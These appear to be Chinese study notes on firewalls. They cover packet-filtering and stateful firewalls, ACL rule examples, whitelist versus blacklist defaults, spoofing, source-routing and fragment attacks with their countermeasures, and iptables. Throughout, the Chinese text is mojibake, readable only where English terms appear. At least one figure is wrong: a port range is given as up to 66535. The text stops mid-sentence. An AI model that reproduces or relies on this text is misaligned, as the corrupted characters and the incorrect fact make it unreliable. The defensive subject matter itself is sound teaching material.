å»ºç«‹ä¸€é“å±éšœï¼Œæ‰€æœ‰æ–¹å‘ä¸Šçš„ç½‘ç»œæµé‡éƒ½éœ€è¦ç»è¿‡é˜²ç«å¢™  é˜²ç«å¢™ä¼šé¢„è®¾ä¸€ç³»åˆ—å®‰å…¨åè®®æ¥å¯¹æ‰€æœ‰è¿™äº›ç»è¿‡çš„æµé‡è¿›è¡Œå®¡è®¡å’Œæ§åˆ¶ï¼ˆå¯ä»¥å¯¹å¼‚å¸¸çš„è¡Œä¸ºè®¾ç½®è­¦æŠ¥ï¼‰  å¯ä»¥å¯¹IP packetæˆ–è€…æ›´æ—©å±‚çš„æ•°æ®è¿›è¡Œè¿‡æ»¤  åŒæ—¶ä¹Ÿå¯ä»¥éƒ¨ç½²NAT(network Address Translation)æœåŠ¡ä»¥åŠä½¿ç”¨ç›‘æ§ç­‰æœåŠ¡  ä¹Ÿå¯ä»¥é€šè¿‡IPSecæ¥å®ç°VPNs   é˜²ç«å¢™çš„æŠ€æœ¯  What? -\u0026gt; Service Control é€šè¿‡ transport layer ports å†³å®š å†³å®š What types of Internet serviceså¯ä»¥é€šè¿‡  Where? -\u0026gt; Direction control é€šè¿‡ {Source adddress -\u0026gt; Destination address} å†³å®š å†³å®šç‰¹å®šæ–¹å‘çš„æµé‡æ˜¯å¦å¯ä»¥é€šè¿‡  Who? -\u0026gt; User control é€šè¿‡ {IP address -\u0026gt; Transport layer port} å†³å®š å†³å®šä»€ä¹ˆæœåŠ¡å¯ä»¥è¢«ä»€ä¹ˆç”¨æˆ·æ‰€è®¿é—®  How? -\u0026gt; Behaviour control æ§åˆ¶æœåŠ¡åº”è¯¥è¢«å¦‚ä½•ä½¿ç”¨ï¼Œæ¯”å¦‚ä¸€äº›æ ¸å¿ƒçš„æœåŠ¡åªèƒ½åœ¨ç‰¹å®šçš„æ—¶é—´è¢«ä½¿ç”¨   é˜²ç«å¢™çš„ç±»å‹  Positive filter ä¸»åŠ¨è¿‡æ»¤ï¼Œç™½åå•è¿‡æ»¤ï¼Œåªå…è®¸ç¬¦åˆè§„åˆ™çš„æ•°æ®é€šè¿‡ï¼Œå…¶ä»–éƒ½ä¸å¯ä»¥é€šè¿‡ å‡è®¾æ‰€æœ‰äººéƒ½æ˜¯åäºº ä¸»åŠ¨åœ°é€‰å®šè°æ˜¯å¥½äººï¼Œå…è®¸å…¶é€šè¿‡  Negative filter è¢«åŠ¨è¿‡æ»¤ï¼Œé»‘åå•è¿‡æ»¤ï¼Œä¸å…è®¸ä¸ç¬¦åˆè§„åˆ™çš„æ•°æ®é€šè¿‡ï¼Œå…¶ä»–éƒ½å¯ä»¥é€šè¿‡ å‡è®¾æ‰€æœ‰äººéƒ½æ˜¯å¥½äºº è¢«åŠ¨åœ°ï¼Œåœ¨å‘ç°äº†åäººä¹‹åï¼Œå°†å…¶è¿‡æ»¤   æ ¹æ®é˜²ç«å¢™çš„ç±»å‹ï¼Œè¿‡æ»¤çš„ç­–ç•¥ä¹Ÿä¼šä¸ä¸€æ ·:  ä¸€ä¸ªæˆ–å¤šä¸ªåè®®å¤´  Payloadçš„å†…å®¹  ä¸€ä¸²æ•°æ®åŒ…çš„pattern   é˜²ç«å¢™çš„é™åˆ¶ é˜²ç«å¢™ä¹Ÿå­˜åœ¨å¾ˆå¤šçš„é™åˆ¶ï¼Œè¦ä¸æ€ä¹ˆéœ€è¦å¤šé“çš„ä¿æŠ¤å‘¢ å…¶æ— æ³•ä¿æŠ¤:  ç»•è¿‡è¿‡æ»¤è§„åˆ™çš„è¿›æ”»  åœ¨å¤–éƒ¨è¢«æ„ŸæŸ“çš„è®¾å¤‡  é€šè¿‡å¤–éƒ¨çš„WiFiç½‘ç»œè¿›è¡Œçš„æ”»å‡»  æ¥è‡ªå†…éƒ¨çš„å¨èƒ     sneakernet\nçƒé‹ç½‘ç»œï¼Œé¡¾åæ€ä¹‰å°±æ˜¯ä½¿ç”¨ç‰©ç†åª’ä»‹è¿è¾“æ•°æ®ï¼Œè€Œéé€šè¿‡ç½‘ç»œï¼Œè®°å¾—ä»¥å‰ä¸Šè®¡ç®—æœºç½‘ç»œçš„æ—¶å€™ï¼Œè€å¸ˆå°±æåˆ°è¿‡ï¼Œåœ¨ç½‘ç»œä¸ç¨³å®šæˆ–è€…è´¨é‡è¾ƒå·®çš„æ—¶å€™ï¼Œå¾€å¾€è¿˜æ˜¯ä½¿ç”¨ç‰©ç†ä¼ è¾“æ›´ä¸ºé«˜æ•ˆ é‚£ä¹ˆè¿™ç§æ—¶å€™ Firewall å°±å®Œå…¨å¤±æ•ˆäº†ï¼Œå› ä¸ºå…¶æ‰€é’ˆå¯¹çš„éƒ½æ˜¯ç½‘ç»œæ•°æ®åŒ…ï¼Œç‰©ç†ä¼ è¾“å®Œå…¨ä¸åœ¨èŒƒç•´ä¹‹å†…     WiFi\nWiFiä¹‹å‰çš„æ•°æ®å…±äº«æ²¡åŠæ³•é›†ä¸­åˆ°Firewallè¿›è¡Œç®¡ç†    Packet filtering firewall What is a packet filtering firewall? åŸºäºæ•°æ®åŒ…è¿‡æ»¤çš„é˜²ç«å¢™ æ˜¯æœ€åŸºç¡€ä¹Ÿæ˜¯æœ€æ™®éä½¿ç”¨çš„é˜²ç«å¢™ï¼Œå…¶ä½œç”¨åœ¨ä¸¤ç§æ•°æ®åŒ…ä¸Šï¼š  Ingress packets: ä»å¤–ç½‘åˆ°å†…ç½‘çš„æ•°æ®åŒ…  Egress packets: ä»å†…ç½‘åˆ°å¤–ç½‘çš„æ•°æ®åŒ…   åŒæ—¶ä¹Ÿå¯¹åº” ingress filtering, egress filtering ä¸¤ç§è¿‡æ»¤æ‰‹æ®µï¼š Packet filtering firewall é€šè¿‡é¢„è®¾ä¸€ç³»åˆ—çš„è§„åˆ™æ¥å†³å®šæ˜¯å¦è®©æŸä¸€ç§æ•°æ®åŒ…é€šè¿‡ï¼Œè€Œè¿™äº›è§„åˆ™éƒ½æ˜¯ç”¨æ¥æ£€æµ‹ IP headers ä»¥åŠ TCP headers, å¯¹äºåº”ç”¨å±‚æ‰€æ”¾å…¥çš„payloadä¸€ç‚¹éƒ½ä¸æ„Ÿå…´è¶£ Packet filtering firewall ä¹Ÿåˆ†æˆ stateless filtering ä»¥åŠ stateful filter,ä¸»è¦çš„åŒºåˆ«å°±åœ¨äºåº”ç”¨çš„è§„åˆ™æ˜¯å¦ä¼šå®¡è®¡ç½‘ç»œè¿æ¥çš„çŠ¶æ€ï¼Œå³åˆ¤æ–­ä¸€ä¸ªæ•°æ®åŒ…çš„å»ç•™æ˜¯å¦ä¼šå‚è€ƒä¹‹å‰çš„è®°å½•ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯è€ƒè™‘äº†ä¸Šä¸‹æ–‡  Stateless filtering æ— çŠ¶æ€è¿‡æ»¤ å…¶æ— çŠ¶æ€çš„è¿‡æ»¤ä¸»è¦ä½“ç°åœ¨ï¼š  å¯¹æ‰€æœ‰æ”¶åˆ°çš„åŒ…éƒ½ä¸€è§†åŒä»ï¼Œå•ç‹¬å†³æ–­æ˜¯å¦æ”¾è¿‡  ä»¥å‰çš„è®°å½•ä¸ä¼šå½±å“å¯¹æ”¹æ•°æ®åŒ…çš„åˆ¤æ–­   æˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡ Packet filtering firewall ä¸»è¦æ˜¯é€šè¿‡å®¡æŸ¥ IP headers ä»¥åŠ TCP headers, é‚£ä¹ˆç»†åŒ–æ¥è¯´ æ˜¯IP headerä¸­çš„ï¼š  Source IP address  Destination IP address  other fields: defines the transport protocol   ä»¥åŠ TCP/UDP header ä¸­çš„ï¼š  Source port  Destination port   é€šè¿‡è®¾å®šå¯¹ä»¥ä¸Šä¿¡æ¯çš„è§„åˆ™æ¥å®ç°è¿‡æ»¤å®¡æŸ¥ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„è¿™äº›è§„åˆ™éƒ½ä¼šè¢«è®°å½•åˆ° ACL (access control list) è®¿é—®æ§åˆ¶åˆ—è¡¨ä¸Š.    è¿‡æ»¤è§„åˆ™\né€šå¸¸æ¥è¯´ï¼ŒACLä¸Šå®šä¹‰çš„è§„åˆ™ä¼šè¢« ä»ä¸Šè‡³ä¸‹ ä¾æ¬¡ä¸å®¡æŸ¥çš„æ•°æ®åŒ…è¿›è¡ŒåŒ¹é…ï¼Œç„¶åæ‰§è¡Œå¯¹åº”çš„åŠ¨ä½œã€‚   é»˜è®¤è§„åˆ™\nä¹‹å‰æˆ‘ä»¬æåˆ°è¿‡ä¸»åŠ¨è¿‡æ»¤å’Œè¢«åŠ¨è¿‡æ»¤ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å±•å¼€è®²è®² Default = discard é»˜è®¤ä¸¢åŒ… : - ä¸»åŠ¨è¿‡æ»¤ï¼ˆä¸»åŠ¨çš„é€‰æ‹©å¯ä»¥é€šè¿‡çš„åå•ï¼‰ - ç™½åå•è¿‡æ»¤ - ç¦æ­¢æœªç»æ˜ç¡®è®¸å¯çš„è¡Œä¸º (That which is not expressively permitted is prohibited) - æ›´ä¸ºç¨³å¥å’Œä¿å®ˆçš„æ”¿ç­– - æ‰€æœ‰è¢«å…è®¸çš„æœåŠ¡éƒ½éœ€è¦ä¸€ä¸ªä¸ªæ·»åŠ  - å¯¹ç”¨æˆ·ä¸å¤ªå‹å¥½ï¼ˆå°±åƒæˆ‘ä»¬ä¹‹å‰æ‰€æåˆ°çš„ï¼Œç”¨æˆ·çš„ç«¯å£æ›´ä¸ºçµæ´»ï¼Œåˆ©ç”¨ç™½åå•ä¸€ä¸ªä¸ªåŠ å¾ˆä¸æ˜æ˜¾ï¼‰ - ç”¨æˆ·çš„å¯è§æ€§éšç€è§„åˆ™çš„å¢åŠ è€Œé™ä½ - ç›¸å¯¹çš„ï¼Œå¯¹ä¼ä¸šå’Œæ”¿åºœæ¥è¯´æ›´åŠ å‹å¥½ Default = forward é»˜è®¤æ”¾è¡Œ : - è¢«åŠ¨è¿‡æ»¤ï¼ˆé»˜è®¤ä¸ç”¨è¿‡æ»¤ï¼Œç›´åˆ°è¢«åŠ¨çš„çŸ¥é“äº†æœ‰å¨èƒæ‰è¿‡æ»¤ï¼‰ - é»‘åå•è¿‡æ»¤ - æ²¡æœ‰æ˜ç¡®ç¦æ­¢çš„å°±æ˜¯å…è®¸çš„ï¼ˆThat which is not expressively prohibited is permittedï¼‰ - è¾ƒäºç™½åå•æ›´ä¸å®‰å…¨ - æ¯å½“å‡ºç°æ–°çš„å¨èƒéœ€è¦æ›´æ–°è®°å½•åˆ°é»‘åå•ä¸Š - é€šå¸¸è¢«å¼€å‘çš„ç»„ç»‡é‡‡çº³ï¼Œæ¯”å¦‚å¤§å­¦ Granularity of filtering è¿‡æ»¤çš„é¢—ç²’åº¦ : é™¤äº†å‰é¢æåˆ°é‚£å‡ ä¸ªå¸¸è§çš„åŒ¹é…è§„åˆ™ï¼Œè¿˜æœ‰ä¸€äº›å†…å®¹å¯ä»¥å®ç°æ›´ç²¾ç¡®çš„è¿‡æ»¤ï¼Œæ ¹æ®firewallä½¿ç”¨çš„ä¸åŒçš„routersæ¥å†³å®š - åœ¨å…¥ç«™æ—¶è¿›è¡Œè¿‡æ»¤ - åœ¨å‡ºç«™æ—¶è¿›è¡Œè¿‡æ»¤ - åœ¨å…¥ç«™å’Œå‡ºç«™åŒæ—¶è¿›è¡Œè¿‡æ»¤ - æ£€æŸ¥æ•°æ®åŒ…çš„å…¶ä»–æ§åˆ¶åŒºåŸŸ     ACLå®ä¾‹\n  Rule set A\n æˆ‘ä»¬å…ˆæ¥çœ‹è¿™ç¬¬ä¸€ç»„è§„åˆ™ \u0026rsquo; * \u0026rsquo; = ANY ç¬¬ä¸€æ¡ : æ‰€æœ‰ä¸ SPIGOT çš„é€šä¿¡éƒ½è¢«ç¦æ­¢äº† 1. ä¸¤ä¸ªç«¯å£å·éƒ½æ²¡æœ‰æŒ‡å®šï¼Œè¯´æ˜è¿™æ¡è§„åˆ™æ²¡æœ‰æ–¹å‘ï¼ˆç«¯å£å·çš„å¤§å°æŒ‡ç¤ºäº†å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ï¼‰ 2. åªæŒ‡å®šäº† SPIGOT çš„IPåœ°å€ï¼Œè¯´æ˜åˆ°SPIGOTçš„æ•°æ®åŒ…å’Œä»SPIGOTæ¥çš„æ•°æ®åŒ…éƒ½ä¼šè¢«ç¦æ­¢ï¼Œä¹Ÿè®¸æ˜¯ä»¥å‰æœ‰è¿‡æ¶æ„è¡Œä¸ºï¼Œæ‰€ä»¥è¢«æ•´ä¸€ä¸ªç¦æ­¢äº† ç¬¬äºŒæ¡ : æ‰€æœ‰å†…ç½‘å¼€å¯çš„SMTPæœåŠ¡éƒ½å…è®¸è¢«å¤–ç½‘æ‰€è¿æ¥ 1. æŒ‡å®šäº†IPåœ°å€ä»¥åŠå¯¹åº”çš„ç«¯å£å·25ï¼Œ æ˜¯SMTPæœåŠ¡æ‰€å¯¹åº”çš„ç«¯å£ 2. è¿™é‡Œæ˜¯å…è®¸å†…ç½‘çš„é‚®ä»¶ç³»ç»Ÿæ”¶å–é‚®ä»¶     Rule set B\né»˜è®¤ä¸¢å¼ƒæ‰€æœ‰çš„æ•°æ®åŒ…  è¿™æ˜¯ä¸€æ¡é»˜è®¤ä¸¢å¼ƒè§„åˆ™ï¼Œä¸€èˆ¬æ¥è¯´æ˜¯æ”¾åœ¨æœ€ä¸‹é¢  é»˜è®¤ä¸¢å¼ƒå°±æ˜¯æˆ‘ä»¬ä¹‹å‰è¯´çš„ä¸»åŠ¨è¿‡æ»¤ï¼Œç™½åå•è¿‡æ»¤  åœ¨æ­¤ä¹‹ä¸Šå°±æ˜¯å®šä¹‰çš„å¯ä»¥é€šè¿‡çš„è§„åˆ™       Rule set C\n  ä¸rule set Aç±»ä¼¼ï¼Œè¿™æ¬¡æ˜¯å…è®¸å†…ç½‘æ‰€æœ‰çš„ä¸»æœºå‘å¤–å‘é‚®ä»¶  ä½†æ˜¯å­˜åœ¨ä¸¤ä¸ªæ¼æ´  æ”»å‡»è€…ä¹Ÿå¯ä»¥ä¿®æ”¹ä»–ä»¬æœåŠ¡ç«¯å£å·åˆ°25ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿æ³„å¯†çš„æ•°æ®ç»•è¿‡é˜²ç«å¢™ç­–ç•¥  attackerä¹Ÿå¯ä»¥ä¿®æ”¹ä»–ä»¬çš„å®¢æˆ·ç«¯ç«¯å£å·åˆ°25ï¼Œä»è€Œç»•è¿‡é˜²ç«å¢™ç­–ç•¥å®ç°å…¥ä¾µï¼Œè¿æ¥å†…ç½‘çš„æœåŠ¡         Rule set D\n ä¸ä¹‹å‰ä¸‰æ¡ä¸åŒçš„æ˜¯ï¼ŒRule set Då¤šäº†flagsçš„ä¿¡æ¯ï¼Œä¸»è¦è¿ç”¨äºTCPçš„è¿æ¥çš„åˆ¤æ–­  ç¬¬ä¸€æ¡å’Œä¹‹å‰Rule set Cä¸€æ ·ï¼Œæ˜¯å…è®¸å†…ç½‘çš„ä¸»æœºå‘é€é‚®ä»¶åˆ°å¤–ç½‘  ç¬¬äºŒæ¡åˆ™åšäº†æ›´å¤šçš„é™åˆ¶ï¼Œè¦æ±‚è¿›å…¥å†…ç½‘çš„é‚®ä»¶éœ€è¦æ˜¯TCP ACKæ•°æ®åŒ…       Rule set E\n  ç¬¬ä¸€æ¡ï¼Œå…è®¸å†…ç½‘çš„ä¸»æœºå‘å¤–å‘é€æ•°æ®  ç¬¬äºŒæ¡ï¼Œå…è®¸å›å¤çš„ACKåŒ…  ç¬¬ä¸‰æ¡ï¼Œå…è®¸å†…ç½‘çš„æœåŠ¡å¯¹å¤–ç½‘çš„å®¢æˆ·ç«¯è¿›è¡Œå›å¤ (port \u0026gt; 1024)         å…¶ä»–å¸¸è§è¿‡æ»¤è§„åˆ™\n  Ingress packet çš„source IP address æ˜¯å†…ç½‘çš„åœ°å€ : æˆ‘ä»¬çŸ¥é“é˜²ç«å¢™æ˜¯å»ºç«‹åœ¨å†…ç½‘å’Œå¤–ç½‘ä¹‹å‰çš„ï¼Œå› æ­¤ Ingress packet åªæœ‰å¯èƒ½æ˜¯ä»å¤–ç½‘çš„åœ°å€åˆ°å†…ç½‘çš„åœ°å€ï¼Œè¿™ç±»ä¸å¯»å¸¸çš„æ•°æ®åŒ…é€šå¸¸éƒ½æ˜¯è¢«æ¶æ„ä¿®æ”¹çš„æ•°æ®åŒ…   æŒ‡å®šäº†è·¯ç”±å™¨çš„æ•°æ®åŒ… : è¿™ç±»æ•°æ®åŒ…é€šå¸¸ä¹Ÿæ˜¯è¢«æ¶æ„ä¿®æ”¹çš„æ¥ç»•è¿‡é˜²ç«å¢™è§„åˆ™çš„   Payloadç‰¹åˆ«å°çš„æ•°æ®åŒ… : è¿™ç±»ç‰¹åˆ«å°çš„æ•°æ®åŒ…ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯ç”¨æ¥åˆ†ç¦»ä¼šè¢«å®¡æŸ¥çš„ä¿¡æ¯ï¼Œä»¥æ­¤æ¥ç»•è¿‡é˜²ç«å¢™è§„åˆ™   æ¥è‡ªå¤–ç½‘åœ°å€çš„ç”¨äºæ§åˆ¶çš„æ•°æ®åŒ… : æœ‰ä¸€äº›æ•°æ®åŒ…æ˜¯ä¸“é—¨ç”¨æ¥è¿›è¡Œå†…ç½‘è®¾å¤‡ç®¡ç†å’Œæ§åˆ¶çš„ï¼Œæ¯”å¦‚DHCP, Bootp, TFTP, NFS, éƒ½æ˜¯æ¥ç»™å†…ç½‘ä¸‹å‘æŒ‡ä»¤æˆ–è€…å‘é€é…ç½®çš„ï¼Œè¿™äº›æ•°æ®åŒ…å¦‚æœæ¥è‡ªå¤–ç½‘å¾ˆæœ‰å¯èƒ½å°±æ˜¯æ¶æ„çš„ï¼Œåº”è¯¥ä¸¢å¼ƒ       Stateless filteringçš„ä¼˜åŠ£åŠ¿ä»¥åŠæ¼æ´\n  Advantages\n å®ç° stateless filtering æ¯”è¾ƒæ–¹ä¾¿  è§„åˆ™å¯¹ç”¨æˆ·æ¯”è¾ƒé€æ˜ï¼Œé€Ÿåº¦ä¹Ÿå¾ˆå¿«       Disadvantages\n æ²¡åŠæ³•å¯¹æ›´é«˜å±‚çš„æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œå› æ­¤æ²¡åŠæ³•éƒ¨ç½²å¯¹äºåº”ç”¨å±‚çš„æ¼æ´çš„è¿‡æ»¤  ä¸€äº›æ¶æ„çš„æŒ‡ä»¤ï¼ˆå­˜åœ¨äºpayloadä¸­ï¼‰æ— æ³•è¢«è¿‡æ»¤  å¦‚æœä¸€ä¸ªå®¢æˆ·ç«¯ç«¯å£å·è¢«å…è®¸é€šè¿‡ï¼ˆ\u0026gt;1024ï¼‰,é‚£ä¹ˆå…¶æ‰€æœ‰çš„æ•°æ®åŒ…éƒ½ä¼šè¢«æ”¾è¡Œ    æ—¥å¿—è®°å½•çš„ä¿¡æ¯è¾ƒå°‘ï¼ˆå› ä¸ºæœ¬æ¥æŒ‡å®šè§„åˆ™ä»¥åŠå®¡æ ¸æ•°æ®åŒ…æ‰€éœ€è¦ç”¨åˆ°çš„æ•°æ®å°±å¾ˆå°‘ï¼‰  æ— æ³•éƒ¨ç½²é«˜çº§çš„è®¤è¯ç³»ç»Ÿ  åŒæ ·å› ä¸ºç¼ºä¹é«˜å±‚çš„å®¡æ ¸åŠŸèƒ½         Vulnerabilities\n æ— æ³•æ£€æµ‹å‡ºTCP/IPè¢«ä¿®æ”¹è¿‡çš„æ•°æ®ï¼Œspoofing attack  æ— æ³•åº”ç”¨æ›´é«˜å±‚çš„å®¡æ ¸æœºåˆ¶ï¼Œå¯¼è‡´æ•°æ®å†…å®¹è¢«ä¿®æ”¹åå³å¯ç»•è¿‡è§„åˆ™    ç”±äºç”¨äºè¿‡æ»¤è§„åˆ™åˆ¶å®šçš„å˜é‡è¾ƒå°‘ï¼Œå› æ­¤é”™è¯¯çš„é…ç½®å¾ˆå®¹æ˜“å°±å‘ç”Ÿäº†ï¼Œä»è€Œæ‹›è‡´å…¥ä¾µ           æ”»é˜²å®ä¾‹\næ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ä¸€äº›æ”»é˜²çš„å®ä¾‹ï¼Œæ¥çœ‹çœ‹stateless filteringèƒ½æŠµå¾¡å“ªäº›æ”»å‡»   IP address spoofing\nIP address spoofing é€šå¸¸éƒ½æ˜¯é€šè¿‡ä¿®æ”¹IPåœ°å€æ¥æ¬ºéª—æœåŠ¡å™¨å…¶çœŸæ­£çš„ä¸»æœºåœ°å€ Countermeasure : - æˆ‘ä»¬å¯ä»¥åˆ¶å®šä¸€äº›è§„åˆ™æ¥é¿å…ä¸€äº›ä¸åˆç†çš„æ•°æ®åŒ…ï¼Œä¾‹å¦‚ - Ingressï¼ˆä»è¿æ¥å¤–ç½‘çš„interfaceä¼ å‘è¿æ¥å†…ç½‘çš„interfaceï¼‰çš„æ•°æ®åŒ…æœ¬æ¥åº”è¯¥æ˜¯å¤–ç½‘åˆ°å†…ç½‘çš„åœ°å€ï¼Œå¯å¦‚æœsource IP addresså˜æˆäº†å¤–ç½‘çš„åœ°å€ï¼Œé‚£å°±æœ‰é—®é¢˜äº†     Source routing attack\nSource routingæ˜¯ä¸€ç§ç‰¹æ®Šçš„è·¯ç”±æœºåˆ¶ï¼Œå³å‘é€æ–¹å¯ä»¥æŒ‡å®šåˆ°è¾¾æ¥æ”¶æ–¹çš„è·¯ç”±ï¼ˆé€šå¸¸æ¥è¯´ï¼Œæˆ‘ä»¬åªæ˜¯æŒ‡å®šgatewayï¼Œç„¶åè®©è·¯ç”±å™¨å»å¯»æ‰¾è·¯ç”±ï¼‰ é‚£ä¹ˆAttackerå¯ä»¥åˆ©ç”¨è¿™ä¸ªæœºåˆ¶æ¥ä¼ªé€ æ•°æ®åŒ…çš„IP addressç»•è¿‡è¿‡æ»¤è§„åˆ™ï¼ŒåŒæ—¶ä½¿ç”¨source routingæŒ‡ç¤ºæ•°æ®åŒ…çœŸæ­£çš„è·¯å¾„å’Œæ–¹å‘ Countermeasure : - ä¸¢å¼ƒæ‰€æœ‰ä½¿ç”¨source routingçš„æ•°æ®åŒ… - ç¦æ­¢è¿™äº›æŒ‡å®šäº†è·¯ç”±çš„æ•°æ®åŒ…     Tiny fragment attacks\nå°±åƒæˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡çš„ï¼Œæ”»å‡»è€…å¯ä»¥å°†æ•°æ®åŒ…åˆ†ç¦»æˆå¤šä¸ªå°çš„æ•°æ®åŒ…ï¼Œå°†æ‰€éœ€è¦çš„ä¿¡æ¯åˆ†æ•£åˆ°å°çš„æ•°æ®åŒ…å½“ä¸­ï¼Œè€Œé˜²ç«å¢™å¾€å¾€åªä¼šæ£€æŸ¥æœ€å¼€å§‹çš„æ•°æ®åŒ…ç‰‡æ®µï¼Œç”±æ­¤å¯ä»¥ç»•è¿‡æ£€æµ‹è§„åˆ™ Countermeasure : - é˜²ç«å¢™å¯ä»¥è®¾å®šä¸€äº›è§„åˆ™æ¯”å¦‚ï¼Œä¸¢å¼ƒæ‰€æœ‰åˆ†æ•£åŒ–çš„TCPæ•°æ®åŒ…ï¼Œæˆ–è€…åœ¨è¿›è¡Œå®¡æ ¸ä¹‹å‰å…ˆé‡ç»„è¿™äº›æ•°æ®åŒ…ç‰‡æ®µ - è§„å®šç¬¬ä¸€ä¸ªæ•°æ®åŒ…ç‰‡æ®µå¿…é¡»å«æœ‰è¶³å¤Ÿå¤šçš„æ•°æ®ä¾¿äºé˜²ç«å¢™å®¡æ ¸       è¡¥å……çŸ¥è¯†\n  TCP port numbers\næˆ‘ä»¬å†æ¥å¤ä¹ ä¸€ä¸‹ TCP port numbers TCP port number ä¸€èˆ¬ç”¨æ¥æŒ‡ç¤ºè¿è¡Œçš„åº”ç”¨æˆ–è€…æœåŠ¡ï¼š  æœåŠ¡å™¨ç«¯ï¼ˆæœ¬åœ°çš„ï¼‰åº”ç”¨çš„ç«¯å£å·ä¸€èˆ¬å°äº1024ï¼Œè¿™äº›ç«¯å£å·ä¸€èˆ¬éƒ½å·²ç»è¢«å ç”¨äº†ï¼Œæˆ‘ä»¬è‡ªå·±åœ¨å†™ç¨‹åºçš„æ—¶å€™åº”è¯¥é¿å…ä½¿ç”¨  è€Œå…¶ä»–1024~66535çš„ç«¯å£å·ä¸€èˆ¬è¢«ç”¨äºå®¢æˆ·ç«¯ï¼ˆå¤–éƒ¨çš„ï¼‰ç¨‹åº (16 bitsç«¯å£å·)   è¿˜è®°å¾—æˆ‘ä»¬ä¹‹å‰çš„é€å¿«é€’çš„ä¾‹å­å—ï¼Œæˆ‘ä»¬è¯´ä¼ è¾“å±‚æ˜¯ä¸Šä¿é™©ï¼ŒIPåœ°å€æ˜¯é€è´§åœ°å€ï¼Œç½‘ç»œå±‚æ˜¯æ‰¾é€è´§çš„åœ°å›¾ï¼ŒMACåœ°å€æ˜¯é‚®ç¼–ï¼Œç‰©ç†å±‚æ˜¯é€è´§ï¼Œé‚£ä¹ˆè¿™ä¸ªç«¯å£å·å°±æ˜¯å†™çš„åå­—ï¼Œè¡¨æ˜æ˜¯ä»€ä¹ˆæœåŠ¡ä¼ è¾“æ•°æ®ç»™ä»€ä¹ˆæœåŠ¡  ä»ä¸­ï¼Œæˆ‘ä»¬åˆçœ‹å‡ºäº†ä¸€äº› stateless filtering çš„å±€é™ï¼Œç”¨æˆ·çš„ç«¯å£å·åƒå˜ä¸‡åŒ–ï¼Œé‚£ä¹ˆå°±ä¼šè®¾ç½®ä¸€ä¸‹è¾ƒä¸ºå®½æ¾çš„è§„åˆ™ï¼Œä»è€Œå¼•å‘æ¼æ´     How to block an entire subnet?\nUse subnet address with CIDR prefix or subnet masksï¼Œä½¿ç”¨å­ç½‘åˆ’åˆ†çš„åç¼€      Stateful firewall Stateful filtering, ä¹Ÿå«åš connection-state filtering,é€šè¿‡è¿½è¸ªå¤–éƒ¨å’Œå†…éƒ¨çš„ä¸»æœºçš„è¿æ¥æ¥å†³å®šå‡ºå…¥è§„åˆ™  Connection state å½“æˆ‘ä»¬è¯´è¿æ¥çš„æ˜¯ï¼ŒæŒ‡çš„å°±æ˜¯ä¸€ä¸ªTCPè¿æ¥çš„çŠ¶æ€ï¼Œæ˜¯å¦å·²ç»å»ºç«‹ï¼ˆUDPä¸å»ºç«‹è¿æ¥ï¼‰   æ‰€æœ‰è¿™äº›å»ºç«‹çš„TCPè¿æ¥éƒ½ä¼šå­˜å…¥ state table (ä½†å¦‚æœä¿å­˜äº†å¤§é‡çš„è¿æ¥ï¼Œå°±ä¼šå‡ºç°TCP SYN Flooding è¿™æ ·çš„æ”»å‡»)    How stateful firewall works?\nå½“æœ‰ingressæˆ–è€…egressçš„æ•°æ®åŒ…é€šè¿‡çš„æ—¶å€™ï¼Œfirwallä¼šæŸ¥æ‰¾ state table æ¥åˆ¤æ–­ä»–ä»¬æ˜¯å¦å±äºè¢«è®°å½•çš„connection å¦‚æœå±äºä¸€ä¸ªè¿æ¥ï¼Œå‘è¡Œï¼Œå¹¶è®°å½•ä¿¡æ¯ï¼ˆæ¯”å¦‚TCP sequence numberï¼Œå¯ä»¥ç”¨æ¥é˜²å¾¡ TCP session hijacking ï¼‰ å¦‚æœä¸å±äºï¼Œå†åˆ¤æ–­è¿™æ˜¯å¦æ˜¯ä¸€ä¸ª TCP SYN packet ç”¨æ¥å»ºç«‹ä¸€ä¸ªè¿æ¥:  å¦‚æœæ˜¯çš„è¯å°±æ–°å¼€ä¸€æ¡è®°å½•ç”¨æ¥è®°å½•è¿™ä¸ªæ–°çš„è¿æ¥  å¦‚æœä¸æ˜¯çš„è¯ï¼Œé‚£å°±ä¸¢å¼ƒ       Drawbacks of stateful firewall?\næˆ‘ä»¬å¯ä»¥åŒæ—¶ä½¿ç”¨ stateful filtering ä»¥åŠ stateless filtering,å› ä¸ºä»ä¸Šé¢çš„æè¿°ä¸­ï¼Œä¹Ÿè®¸æœ‰ä¸€äº›æœ‹å‹å·²ç»å—…åˆ°äº†ä¸€ä¸æ¼æ´çš„å‘³é“ï¼Œå­˜å‚¨ -\u0026gt; Emm -\u0026gt;flooding lol. æŸ¥è¯¢è¿æ¥ï¼Œåˆ¤æ–­ä»å±ï¼Œè®°å½•ä¿¡æ¯ç­‰ç­‰è¿™äº›åŠ¨ä½œéƒ½éœ€è¦æ¶ˆè€—å¤§é‡çš„å­˜å‚¨ç©ºé—´å’ŒCPUèµ„æºï¼Œå› æ­¤å¾ˆå®¹æ˜“é­å—æ”»å‡»ï¼Œå› æ­¤å¯ä»¥é€‰æ‹©åªä¿å­˜æœ‰é™çš„ä¿¡æ¯ï¼Œä»¥åŠä¸€æ®µæ—¶é—´å†…çš„è¿æ¥æ¥å‡å°‘æ¶ˆè€—     IPTables\nIPtablesæ˜¯Linuxçš„ stateful packet filteringå·¥å…·ï¼Œå…¶ä¸»è¦çš„åŠŸèƒ½æœ‰ä¸¤ä¸ªï¼š Tables :\nChains : å®šä¹‰äº†ä¸€ç³»åˆ—çš„è¿‡æ»¤è§„åˆ™ç”¨æ¥å¤„ç†ç»è¿‡çš„æ•°æ®åŒ…ï¼Œç„¶ååšå‡ºå“åº”çš„å†³å®šï¼ˆaccept or dropï¼‰   Stateful firwall and proxy firewall Circuit-level gateway/proxy firewall Circuit-level gateway/proxy firewall ä½äº session layer ä¼šè¯å±‚ï¼Œæ 